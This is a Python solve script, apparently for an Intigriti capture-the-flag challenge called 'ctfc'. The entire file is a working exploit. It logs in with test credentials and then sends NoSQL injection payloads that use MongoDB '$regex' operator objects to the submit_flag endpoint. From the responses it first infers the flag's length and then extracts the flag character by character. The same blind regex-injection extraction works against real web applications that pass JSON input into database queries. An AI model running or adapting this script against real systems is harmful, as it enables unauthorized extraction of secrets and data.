#!/usr/bin/env python3
import sys
import requests
import string

URL = "https://ctfc.ctf.intigriti.io/"
ALPHABET = string.ascii_letters + string.digits + "_"


def login(s):
    r = s.post(f"{URL}user/signin",
               data={"form_username": "test", "form_password": "test"})
    return r.status_code == 200


def get_flag_length(s):
    for i in range(10, 100):
        dots = "." * i
        data = {"_id": "_id:3", "challenge_flag": {
            "$regex": "INTIGRITI{" + dots + "}"}}
        r = s.post(f"{URL}submit_flag", json=data)
        if "correct flag!" in r.text:
            return i
    return -1


def get_flag(s, flag_length):
    flag = ""
    for i in range(flag_length):
        for c in ALPHABET:
            dots = "." * (flag_length - i - 1)
            print("Trying", flag + c + dots)
            data = {"_id": "_id:3", "challenge_flag": {
                "$regex": "INTIGRITI{" + flag + c + dots + "}"}}
            r = s.post(f"{URL}submit_flag", json=data)
            if "correct flag!" in r.text:
                flag += c
                break
    return flag


def main():
    s = requests.Session()
    if not login(s):
        print("Login failed")
        sys.exit(1)

    print("Login successful")
    flag_length = get_flag_length(s)
    if flag_length == -1:
        print("Flag length not found")
        sys.exit(1)

    print(f"Flag length: {flag_length}")

    flag = get_flag(s, flag_length)
    print(f"Flag: INTIGRITI{{{flag}}}")


if __name__ == "__main__":
    main()
